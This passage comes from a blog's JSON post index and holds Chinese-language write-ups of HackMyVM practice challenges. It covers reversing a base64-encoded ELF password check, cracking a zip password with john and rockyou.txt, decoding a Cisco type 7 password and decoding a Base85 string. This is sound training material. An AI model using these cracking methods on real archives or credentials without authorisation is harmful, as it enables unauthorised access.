lwEAABAA\nGgAoQAAAAAAAAAAAAAAAAAAAowEAABIADwBZEQAAAAAAAE8BAAAAAAAAqAEAABIAAAAAAAAAAAAA\nAAAAAAAAAAAAwQEAABECGQAoQAAAAAAAAAAAAAAAAAAAzQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA\n5wEAACIAAAAAAAAAAAAAAAAAAAAAAAAAAgIAABICDAAAEAAAAAAAAAAAAAAAAAAAAFNjcnQxLm8A\nX19hYmlfdGFnAGNydHN0dWZmLmMAZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRv\ncnNfYXV4AGNvbXBsZXRlZC4wAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5\nAGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBmaWxlLmMAX19GUkFN\nRV9FTkRfXwBfRFlOQU1JQwBfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVf\nAF9fbGliY19zdGFydF9tYWluQEdMSUJDXzIuMzQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxl\nAF9lZGF0YQBfZmluaQBzdHJsZW5AR0xJQkNfMi4yLjUAcHJpbnRmQEdMSUJDXzIuMi41AF9fZGF0\nYV9zdGFydABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUAX0lPX3N0ZGluX3VzZWQAX2VuZABf\nX2Jzc19zdGFydABtYWluAF9faXNvYzk5X3NjYW5mQEdMSUJDXzIuNwBfX1RNQ19FTkRfXwBfSVRN\nX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMi41AF9pbml0AAAu\nc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LnByb3BlcnR5AC5ub3Rl\nLmdudS5idWlsZC1pZAAubm90ZS5BQkktdGFnAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdu\ndS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5n\nb3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJh\neQAuZmluaV9hcnJheQAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAbAAAAAQAAAAIAAAAAAAAAGAMAAAAAAAAYAwAAAAAAABwAAAAAAAAAAAAAAAAAAAAB\nAAAAAAAAAAAAAAAAAAAAIwAAAAcAAAACAAAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAAAAA\nAAAAAAAACAAAAAAAAAAAAAAAAAAAADYAAAAHAAAAAgAAAAAAAABYAwAAAAAAAFgDAAAAAAAAJAAA\nAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABJAAAABwAAAAIAAAAAAAAAfAMAAAAAAAB8AwAA\nAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAVwAAAPb//28CAAAAAAAAAKADAAAA\nAAAAoAMAAAAAAAAkAAAAAAAAAAYAAAAAAAAACAAAAAAAAAAAAAAAAAAAAGEAAAALAAAAAgAAAAAA\nAADIAwAAAAAAAMgDAAAAAAAA2AAAAAAAAAAHAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABpAAAAAwAA\nAAIAAAAAAAAAoAQAAAAAAACgBAAAAAAAAK8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA\ncQAAAP///28CAAAAAAAAAFAFAAAAAAAAUAUAAAAAAAASAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAAC\nAAAAAAAAAH4AAAD+//9vAgAAAAAAAABoBQAAAAAAAGgFAAAAAAAAQAAAAAAAAAAHAAAAAQAAAAgA\nAAAAAAAAAAAAAAAAAACNAAAABAAAAAIAAAAAAAAAqAUAAAAAAACoBQAAAAAAAMAAAAAAAAAABgAA\nAAAAAAAIAAAAAAAAABgAAAAAAAAAlwAAAAQAAABCAAAAAAAAAGgGAAAAAAAAaAYAAAAAAABIAAAA\nAAAAAAYAAAAYAAAACAAAAAAAAAAYAAAAAAAAAKEAAAABAAAABgAAAAAAAAAAEAAAAAAAAAAQAAAA\nAAAAFwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACcAAAAAQAAAAYAAAAAAAAAIBAAAAAA\nAAAgEAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAApwAAAAEAAAAGAAAAAAAA\nAGAQAAAAAAAAYBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAALAAAAABAAAA\nBgAAAAAAAABwEAAAAAAAAHAQAAAAAAAAOAIAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC2\nAAAAAQAAAAYAAAAAAAAAqBIAAAAAAACoEgAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAA\nAAAAAAAAvAAAAAEAAAACAAAAAAAAAAAgAAAAAAAAACAAAAAAAABSAAAAAAAAAAAAAAAAAAAABAAA\nAAAAAAAAAAAAAAAAAMQAAAABAAAAAgAAAAAAAABUIAAAAAAAAFQgAAAAAAAALAAAAAAAAAAAAAAA\nAAAAAAQAAAAAAAAAAAAAAAAAAADSAAAAAQAAAAIAAAAAAAAAgCAAAAAAAACAIAAAAAAAAKwAAAAA\nAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA3AAAAA4AAAADAAAAAAAAANA9AAAAAAAA0C0AAAAA\nAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOgAAAAPAAAAAwAAAAAAAADYPQAAAAAA\nANgtAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAD0AAAABgAAAAMAAAAAAAAA\n4D0AAAAAAADgLQAAAAAAAOABAAAAAAAABwAAAAAAAAAIAAAAAAAAABAAAAAAAAAAqwAAAAEAAAAD\nAAAAAAAAAMA/AAAAAAAAwC8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAP0A\nAAABAAAAAwAAAAAAAADoPwAAAAAAAOgvAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAA\nAAAAAAAGAQAAAQAAAAMAAAAAAAAAGEAAAAAAAAAYMAAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAA\nAAAAAAAAAAAAAAAADAEAAAgAAAADAAAAAAAAAChAAAAAAAAAKDAAAAAAAAAIAAAAAAAAAAAAAAAA\nAAAAAQAAAAAAAAAAAAAAAAAAABEBAAABAAAAMAAAAAAAAAAAAAAAAAAAACgwAAAAAAAAHgAAAAAA\nAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAABIMAAAAAAA\nAJADAAAAAAAAHQAAABIAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA\n2DMAAAAAAAAIAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAA\nAAAAAAAAAOA1AAAAAAAAGgEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=                                                                                                                                                                                   \n```\n\n![image-20250612184500514](https://7r1umphk.github.io/image/202506121845914.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ base64 -d 21.txt > 21\nbase64: invalid input\n                         \n```\n\n\u5ffd\u7565\u975e\u6cd5\u5b57\u7b26\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ base64 -d -i 21.txt > 21\n        \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ file 21            \n21: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8d11d870b5649e8ca1a0b6777160c1fc53f1f051, for GNU/Linux 3.2.0, not stripped\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ./21       \nEnter passwd: 123456\nAlmost                                                                                                                                                                       \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ strings 21                 \n/lib64/ld-linux-x86-64.so.2\n__cxa_finalize\n__libc_start_main\nstrlen\n__isoc99_scanf\nprintf\nlibc.so.6\nGLIBC_2.7\nGLIBC_2.2.5\nGLIBC_2.34\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nPTE1\nu+UH\n$uperZecretP4zz\nEnter passwd: \nAlmost\nCorrect\nreally close\nClose\nIncorrect\n;*3$'\nGCC: (Debian 12.2.0-1) 12.2.0\nScrt1.o\n__abi_tag\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.0\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nfile.c\n__FRAME_END__\n_DYNAMIC\n__GNU_EH_FRAME_HDR\n_GLOBAL_OFFSET_TABLE_\n__libc_start_main@GLIBC_2.34\n_ITM_deregisterTMCloneTable\n_edata\n_fini\nstrlen@GLIBC_2.2.5\nprintf@GLIBC_2.2.5\n__data_start\n__gmon_start__\n__dso_handle\n_IO_stdin_used\n_end\n__bss_start\nmain\n__isoc99_scanf@GLIBC_2.7\n__TMC_END__\n_ITM_registerTMCloneTable\n__cxa_finalize@GLIBC_2.2.5\n_init\n.symtab\n.strtab\n.shstrtab\n.interp\n.note.gnu.property\n.note.gnu.build-id\n.note.ABI-tag\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.plt.got\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.dynamic\n.got.plt\n.data\n.bss\n.comment\n       \n```\n\nida\n\n```\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char s[264]; // [rsp+0h] [rbp-120h] BYREF\n  const char *v5; // [rsp+108h] [rbp-18h]\n  int i; // [rsp+114h] [rbp-Ch]\n  int v7; // [rsp+118h] [rbp-8h]\n  int v8; // [rsp+11Ch] [rbp-4h]\n\n  v5 = '$uperZecretP4zz';\n  v8 = 0;\n  v7 = 1;\n  printf('Enter passwd: ');\n  __isoc99_scanf('%s', s);\n  if ( strlen(s) == 6 )\n  {\n    if ( s[0] == 80 )\n    {\n      for ( i = 1; i <= 5; ++i )\n      {\n        v8 += s[i] - 48;\n        v7 *= s[i] - 48;\n      }\n      if ( v8 == 24 && v7 == 2048 )\n      {\n        if ( s[1] == 56 )\n          printf('Correct');\n        else\n          printf('really close');\n      }\n      else\n      {\n        printf('Close');\n      }\n    }\n    else\n    {\n      printf('Almost');\n    }\n  }\n  else\n  {\n    printf('Incorrect');\n  }\n  return 0;\n}\n```\n\n\u5206\u6790\n\n```\nscanf('%s', s); // \u7528\u6237\u8f93\u5165\u5bc6\u7801\uff0c\u6700\u591a 263 \u5b57\u8282\uff0c\u5b58\u5728 s \u6570\u7ec4\u4e2d\nif (strlen(s) == 6) // \u5bc6\u7801\u957f\u5ea6\u5fc5\u987b\u662f 6\n{\n    if (s[0] == 80) // \u7b2c\u4e00\u4e2a\u5b57\u7b26\u5fc5\u987b\u662f ASCII \u503c 80 -> 'P'\n    {\n        // \u5bf9\u540e5\u4f4d\u5b57\u7b26 (s[1] \u5230 s[5])\uff0c\u505a\u4ee5\u4e0b\u5904\u7406\uff1a\n        // \u5b83\u4eec\u5fc5\u987b\u662f\u6570\u5b57\u5b57\u7b26\uff08\u56e0\u4e3a\u51cf\u53bb '0'(48)\uff09\uff0c\u5426\u5219\u6c42\u548c\u4e58\u79ef\u4f1a\u9519\u8bef\n        for (i = 1; i <= 5; ++i)\n        {\n            v8 += s[i] - 48; // \u52a0\u603b\n            v7 *= s[i] - 48; // \u4e58\u79ef\n        }\n\n        if (v8 == 24 && v7 == 2048) // \u6ee1\u8db3\u52a0\u548c\u4e0e\u4e58\u79ef\u6761\u4ef6\n        {\n            if (s[1] == 56) // \u7b2c\u4e8c\u4e2a\u5b57\u7b26\u5fc5\u987b\u662f '8'\n                printf('Correct');\n            else\n                printf('really close');\n        }\n        else\n        {\n            printf('Close');\n        }\n    }\n    else\n    {\n        printf('Almost');\n    }\n}\nelse\n{\n    printf('Incorrect');\n}\n\n```\n\n**\u5bfb\u627e\u4e00\u4e2a\u4ee5 'P8' \u5f00\u5934\u76846\u4f4d\u5bc6\u7801\uff0c\u5176\u540e4\u4f4d\u6570\u5b57\u4e0e\u6570\u5b578\u76f8\u52a0\u603b\u548c\u4e3a24\uff0c\u76f8\u4e58\u603b\u79ef\u4e3a2048\u3002**\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ./21\nEnter passwd: P84444\nCorrect                                                                                \n```\n\nsentence", "top": 0, "createdAt": 1751016722, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P80": {"htmlDir": "docs/post/Challenge 022.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 022", "postUrl": "post/Challenge%20022.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/80", "commentNum": 0, "wordCount": 839, "description": "![image-20250612185701829](https://7r1umphk.github.io/image/202506121857127.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 022.zip \n-rwxr-xr-x 1 kali kali 197976 Jun 12 06:57 022.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 022.zip \nArchive:  022.zip\n extracting: 022.png                 \n                    \n```\n\n![022](https://7r1umphk.github.io/image/202506121857563.webp)\n\nhttps://www.dcode.fr/symbols-ciphers\n\u6253\u5f00\u5217\u8868\u627e\u5c31\u5b8c\u4e8b\u4e86\n\n![image-20250612185931605](https://7r1umphk.github.io/image/202506121859794.webp)\n\nhttps://www.dcode.fr/birds-on-a-wire-cipher\n\n![image-20250612190245248](https://7r1umphk.github.io/image/202506121902532.webp)\n\n```\nBLUEBIRD\n```\n\nsentence", "top": 0, "createdAt": 1751016725, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P81": {"htmlDir": "docs/post/Challenge 023.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 023", "postUrl": "post/Challenge%20023.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/81", "commentNum": 0, "wordCount": 327, "description": "![image-20250612190323903](https://7r1umphk.github.io/image/202506121903204.webp)\n\n```\n022E296D100B1622455D0A16031B130C11\n```\n\ncisco type 7\n\nhttps://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html\n\n![image-20250612190738406](https://7r1umphk.github.io/image/202506121907603.webp)\n\n```\nHMV{myciscoflag}\n```\n\nsentence", "top": 0, "createdAt": 1751016727, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P82": {"htmlDir": "docs/post/Challenge 008.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 008", "postUrl": "post/Challenge%20008.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/82", "commentNum": 0, "wordCount": 2684, "description": "# Challenge 008\n\n# Challenge 008\n\n**\u6311\u6218\u94fe\u63a5:** https://hackmyvm.eu/challenges/challenge.php?c=008\n\n![\u6311\u6218\u56fe\u7247](https://7r1umphk.github.io/image/20250518104404775.webp)\n\n## 1. \u521d\u6b65\u5206\u6790\n\n\u6311\u6218\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53ef\u4e0b\u8f7d\u6587\u4ef6\uff1a`008.zip`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 008.zip      \n-rwxr-xr-x 1 kali kali 178 May 17 22:44 008.zip\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 008.zip     \nArchive:  008.zip\n   skipping: flag.txt                need PK compat. v5.1 (can do v4.6)\n```\n\u6587\u4ef6\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684 zip \u538b\u7f29\u5305\uff08178 \u5b57\u8282\uff09\u3002\u5e76\u4e14\u5b83\u53d7\u5bc6\u7801\u4fdd\u62a4\uff0c\u5185\u90e8\u5305\u542b\u4e00\u4e2a flag \u6587\u4ef6\u3002\n\n## 2. \u5bc6\u7801\u7834\u89e3\n\n\u4e3a\u4e86\u7834\u89e3 zip \u6587\u4ef6\u7684\u5bc6\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 `zip2john` \u63d0\u53d6\u54c8\u5e0c\u503c\uff0c\u7136\u540e\u4f7f\u7528 `john`\u8fdb\u884c\u7834\u89e3\u3002\n\n### 2.1 \u63d0\u53d6\u54c8\u5e0c\n\n\u9996\u5148\uff0c\u4f7f\u7528 `zip2john` \u5c06 `008.zip` \u6587\u4ef6\u7684\u54c8\u5e0c\u503c\u63d0\u53d6\u5e76\u4fdd\u5b58\u5230 `hash` \u6587\u4ef6\u4e2d\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ zip2john 008.zip > hash\n```\n\n\u67e5\u770b `hash` \u6587\u4ef6\u7684\u5185\u5bb9\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat hash \n008.zip/flag.txt:$zip2$*0*3*0*751e06905814ebe63a63c72e8755d887*d807*e*25e3c7613e997071cd21a2163883*ba4cf18e59493b2515da*$/zip2$:flag.txt:008.zip:008.zip\n```\n\u8fd9\u4e32\u5b57\u7b26\u5c31\u662f `john` \u53ef\u4ee5\u8bc6\u522b\u7684\u54c8\u5e0c\u683c\u5f0f\u3002\n\n### 2.2 \u4f7f\u7528 John the Ripper \u7834\u89e3\u54c8\u5e0c\n\n\u63a5\u4e0b\u6765\uff0c\u4f7f\u7528 `john` \u548c\u4e00\u4e2a\u5e38\u89c1\u7684\u5bc6\u7801\u5b57\u5178\uff08\u4f8b\u5982 `rockyou.txt`\uff09\u6765\u7834\u89e3\u8fd9\u4e2a\u54c8\u5e0c\u503c\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])\nCost 1 (HMAC size) is 14 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsurvivor         (008.zip/flag.txt)     \n1g 0:00:00:00 DONE (2025-05-17 22:46) 6.666g/s 218453p/s 218453c/s 218453C/s 123456..eatme1\nUse the '--show' option to display all of the cracked passwords reliably\nSession completed.\n```\n\u4ece\u8f93\u51fa\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c\u7834\u89e3\u5f97\u5230\u7684\u5bc6\u7801\u662f `survivor`\u3002\n\n## 3. \u89e3\u538b\u6587\u4ef6\u5e76\u83b7\u53d6 Flag\n\n\u5f97\u5230\u5bc6\u7801\u540e\uff0c\u6211\u4eec\u5c1d\u8bd5\u89e3\u538b `008.zip` \u6587\u4ef6\u3002\n\n\u6807\u51c6\u7684 `unzip` \u547d\u4ee4\u53ef\u80fd\u4f1a\u56e0\u4e3a PKWARE \u7248\u672c\u517c\u5bb9\u6027\u95ee\u9898\u800c\u5931\u8d25\uff1a\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 008.zip     \nArchive:  008.zip\n   skipping: flag.txt                need PK compat. v5.1 (can do v4.6)\n```\n\u63d0\u793a `need PK compat. v5.1 (can do v4.6)`\uff0c\u8868\u660e\u5f53\u524d\u7684 `unzip` \u5de5\u5177\u7248\u672c\u53ef\u80fd\u4e0d\u5b8c\u5168\u652f\u6301\u8be5 zip \u6587\u4ef6\u7684\u52a0\u5bc6\u7279\u6027\u3002\n\n\u6211\u4eec\u53ef\u4ee5\u6539\u7528 `7z` (7-Zip) \u547d\u4ee4\u8fdb\u884c\u89e3\u538b\uff0c\u5b83\u901a\u5e38\u5177\u6709\u66f4\u597d\u7684\u517c\u5bb9\u6027\uff1a\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ 7z x 008.zip\n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 178 bytes (1 KiB)\n\nExtracting archive: 008.zip\n--\nPath = 008.zip\nType = zip\nPhysical Size = 178\n\nEnter password (will not be echoed):\n```\n\u6b64\u65f6\uff0c\u8f93\u5165\u4e4b\u524d\u7834\u89e3\u5f97\u5230\u7684\u5bc6\u7801 `survivor`\uff1a\n```bash\nEnter password (will not be echoed):survivor  # \u6b64\u5904\u8f93\u5165\u5bc6\u7801\uff0c\u7ec8\u7aef\u4e0d\u56de\u663e\nEverything is Ok\n\nSize:       14\nCompressed: 178\n```\n\u89e3\u538b\u6210\u529f\u540e\uff0c\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u751f\u6210 `flag.txt` \u6587\u4ef6\u3002\u67e5\u770b\u5176\u5185\u5bb9\uff1a\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat flag.txt \nHMV{cromiphi}\n```\n\n## 4. Flag\n\n\u6700\u7ec8\u7684 Flag \u662f\uff1a\n```\nHMV{cromiphi}\n```\nsentence", "top": 0, "createdAt": 1751016729, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P83": {"htmlDir": "docs/post/Challenge 010.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 010", "postUrl": "post/Challenge%20010.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/83", "commentNum": 0, "wordCount": 1035, "description": "# 1. \u521d\u6b65\u5206\u6790\n\n**\u6311\u6218\u94fe\u63a5:** https://hackmyvm.eu/challenges/challenge.php?c=010\n\n![\u6311\u6218\u56fe\u7247](https://7r1umphk.github.io/image/20250518105910057.webp)\n\n## 1. \u521d\u6b65\u5206\u6790\n\n\u6311\u6218\u9875\u9762\u76f4\u63a5\u663e\u793a\u4e86\u4e00\u4e32\u770b\u8d77\u6765\u7ecf\u8fc7\u7f16\u7801\u7684\u5b57\u7b26\u4e32\uff1a\n\n```\n853-3GB.eOG[ko/A7oS$FF=\n```\n\n\u8fd9\u4e32\u5b57\u7b26\u5305\u542b\u4e86\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u4ee5\u53ca\u4e00\u4e9b\u7279\u6b8a\u7b26\u53f7 (`-`, `.`, `[`, `]`, `/`, `$`, `=`)\u3002\u8fd9\u79cd\u5b57\u7b26\u96c6\u901a\u5e38\u6697\u793a\u4e86\u67d0\u79cd Base \u7f16\u7801\uff0c\u7279\u522b\u662f\u5b57\u7b26\u79cd\u7c7b\u6bd4 Base64 \u66f4\u5e7f\uff0c\u56e0\u6b64\u53ef\u4ee5\u521d\u6b65\u6000\u7591\u662f Base85 \u6216\u5176\u53d8\u79cd\u3002\n\n## 2. \u89e3\u7801\u8fc7\u7a0b\n\n\u4e3a\u4e86\u89e3\u5f00\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u9700\u8981\u8bc6\u522b\u5176\u7f16\u7801\u65b9\u5f0f\u5e76\u4f7f\u7528\u76f8\u5e94\u7684\u5de5\u5177\u8fdb\u884c\u89e3\u7801\u3002\n\n### 2.1 \u7f16\u7801\u5206\u6790\u4e0e\u5de5\u5177\u9009\u62e9\n\n\u89c2\u5bdf\u5b57\u7b26\u4e32 `853-3GB.eOG[ko/A7oS$FF=` \u7684\u7279\u5f81\uff1a\n*   \u5305\u542b\u6570\u5b57 (0-9)\n*   \u5305\u542b\u5927\u5199\u5b57\u6bcd (A-Z)\n*   \u5305\u542b\u5c0f\u5199\u5b57\u6bcd (a-z)\n*   \u5305\u542b\u7279\u6b8a\u7b26\u53f7 (`-`, `.`, `[`, `]`, `/`, `$`, `=`)\n\n\u8fd9\u79cd\u5e7f\u6cdb\u7684\u5b57\u7b26\u96c6\uff0c\u5c24\u5176\u662f\u7279\u6b8a\u7b26\u53f7\u7684\u51fa\u73b0\uff0c\u5f3a\u70c8\u6307\u5411\u4e86 Base85 (\u4e5f\u79f0\u4e3a Ascii85) \u7f16\u7801\u3002\n\nCyberChef \u662f\u4e00\u4e2a\u975e\u5e38\u5f3a\u5927\u7684\u5728\u7ebf\u7f16\u89e3\u7801\u5de5\u5177\uff0c\u652f\u6301\u591a\u79cd\u7f16\u7801\u683c\u5f0f\uff0c\u975e\u5e38\u9002\u5408\u7528\u4e8e\u5c1d\u8bd5\u89e3\u7801\u6b64\u7c7b\u5b57\u7b26\u4e32\u3002\n\n### 2.2 \u4f7f\u7528 CyberChef \u8fdb\u884c\u89e3\u7801\n\n\u6211\u4eec\u5c06\u5b57\u7b26\u4e32\u7c98\u8d34\u5230 CyberChef \u4e2d\uff0c\u5e76\u5e94\u7528 'From Base85' \u64cd\u4f5c\u3002\n\n1.  \u6253\u5f00 CyberChef\u3002\n2.  \u5c06\u8f93\u5165\u5b57\u7b26\u4e32 `853-3GB.eOG[ko/A7oS$FF=` \u7c98\u8d34\u5230 'Input' \u6846\u4e2d\u3002\n3.  \u5728 'Operations' \u5217\u8868\u4e2d\u641c\u7d22 'From Base85' \u5e76\u5c06\u5176\u62d6\u62fd\u5230 'Recipe' \u533a\u57df\u3002\n\nCyberChef \u7684\u64cd\u4f5c\u754c\u9762\u548c\u7ed3\u679c\u5982\u4e0b\uff1a\n\n![CyberChef \u89e3\u7801 Base85](https://7r1umphk.github.io/image/20250518105917695.webp)\n\n\u89e3\u7801\u540e\u7684\u8f93\u51fa\u5373\u4e3a Flag\u3002\n\n## 3. Flag\n\n\u4ece CyberChef \u7684\u89e3\u7801\u7ed3\u679c\u4e2d\uff0c\u6211\u4eec\u83b7\u5f97\u4e86\u6700\u7ec8\u7684 Flag\uff1a\n\n```\nHMV{wrtzxcvfdghyt}\n```sentence", "top": 0, "createdAt": 1751016733, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P84": {"htmlDir": "docs/post/Challenge 012.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 012", "postUrl": "post/Challenge%20012.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/84", "commentNum": 0, "wordCount": 508, "description": "# Challenge 012\n\n# Challenge 012\n\n**\u6311\u6218\u94fe\u63a5:** https://hackmyvm.eu/challenges/challenge.php?c=012\n\n![\u6311\u6218\u56fe\u7247](https://7r1umphk.github.io/image/20250518110545680.webp)\n\n## 1. \u521d\u6b65\u5206\u6790\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 012.zip 012.mp3 \n-rwxr-xr-x 1 kali kali 17286 Mar  6  2022 012.mp3\n-rwxr-xr-x 1 kali kali 16978 May 17 23:06 